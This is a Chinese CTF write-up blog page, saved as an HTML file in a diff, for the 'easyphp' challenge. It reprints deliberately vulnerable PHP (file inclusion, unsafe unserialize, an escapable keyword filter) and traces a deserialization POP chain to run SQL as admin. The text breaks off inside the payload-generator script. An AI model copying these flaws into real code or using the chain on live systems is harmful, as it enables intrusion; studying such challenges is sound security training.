@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目考点： 反序列化POP链构造 反序列化字符串逃逸  题目源码12345678910111213141516//index.php&amp;lt;?phprequire_once &quot;lib.php&quot;;if(isset($_GET[&apos;action&apos;]))&amp;#123;	require_once(__DIR__.&quot;/&quot;.$_GET[&apos;action&apos;].&quot;.php&quot;);&amp;#125;else&amp;#123;	if(">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋战“疫”easyphp题解">
+<meta property="og:url" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/index.html">
+<meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="题目考点： 反序列化POP链构造 反序列化字符串逃逸  题目源码12345678910111213141516//index.php&amp;lt;?phprequire_once &quot;lib.php&quot;;if(isset($_GET[&apos;action&apos;]))&amp;#123;	require_once(__DIR__.&quot;/&quot;.$_GET[&apos;action&apos;].&quot;.php&quot;);&amp;#125;else&amp;#123;	if(">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/1.png">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/2.png">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/3.png">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/4.png">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/5.png">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/6.png">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/7.png">
+<meta property="og:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/8.png">
+<meta property="og:updated_time" content="2020-02-26T12:03:43.819Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="春秋战“疫”easyphp题解">
+<meta name="twitter:description" content="题目考点： 反序列化POP链构造 反序列化字符串逃逸  题目源码12345678910111213141516//index.php&amp;lt;?phprequire_once &quot;lib.php&quot;;if(isset($_GET[&apos;action&apos;]))&amp;#123;	require_once(__DIR__.&quot;/&quot;.$_GET[&apos;action&apos;].&quot;.php&quot;);&amp;#125;else&amp;#123;	if(">
+<meta name="twitter:image" content="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/">
+
+
+
+
+
+  <title>春秋战“疫”easyphp题解 | yemoli's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yemoli's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            friends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2020/02/26/春秋战“疫”easyphp题解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="夜莫离、">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yemoli's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">春秋战“疫”easyphp题解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-26T17:53:29+08:00">
+                2020-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>题目考点：</p>
+<p>反序列化POP链构造</p>
+<p>反序列化字符串逃逸</p>
+</blockquote>
+<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.$_GET[<span class="string">'action'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">echo</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        </span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line"></span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目获取到flag的条件是需要使用admin登陆，我们需要找到可控点来执行我们的sql语句，首先就是pop链的寻找</p>
+<p>值得注意的是<code>dbCtrl</code>类中的login方法，该处可以执行任意<code>sql</code>语句，在满足某些条件时可以返回执行的部分结果</p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/1.png" alt=""></p>
+<p>那么我们向上寻找如何可以触发该处函数，注意到<code>Info</code>类中的<code>__call</code>方法，我们可以将<code>CtrlCase</code>赋值为一个<code>dbCtrl</code>类的对象</p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/2.png" alt="2"></p>
+<p>接着寻找如何触发<code>__call</code>方法，可以看到User类的<code>__toString</code> 方法满足该条件,只需要将<code>nickname</code>赋值为一个<code>Info</code>类的对象即可</p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/3.png" alt="3"></p>
+<p>触发<code>__toString</code>的方式也很简单，在<code>UpdateHelper</code>类中将<code>sql</code>变量赋值为<code>User</code>类的对象，这样该类在触发<code>destruct</code>方法的时候会自动触发<code>__toString</code>方法</p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/4.png" alt="4"></p>
+<p>现在理一下pop链的顺序</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt;UpdateHelper(__destruct) <span class="variable">$sql</span>=new User</span><br><span class="line">-&gt;User(__toString) <span class="variable">$nickname</span>=new <span class="builtin-name">Info</span>    <span class="variable">$age</span>=<span class="string">"select password from user where username=?"</span></span><br><span class="line">-&gt;<span class="builtin-name">Info</span>(__call) <span class="variable">$CtrlCase</span>=new dbCtrl</span><br><span class="line">-&gt;dbCtrl(login)</span><br></pre></td></tr></table></figure>
+<p>下面需要寻找一下触发反序列化的位置，通过<code>update.php</code>中的代码可以定位到触发点在<code>User</code>类的<code>update</code>方法</p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/5.png" alt="5"></p>
+<p>接着跟到<code>getNewinfo</code>方法，该处接收两个参数并且经过一个safe函数的过滤</p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/6.png" alt="6"></p>
+<p>这里就涉及到了字符串的逃逸，通过<code>safe</code>函数的过滤使前后字符串的长度不同造成逃逸，我们先来生成所需要的反序列化内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line">    &#125; </span><br><span class="line">    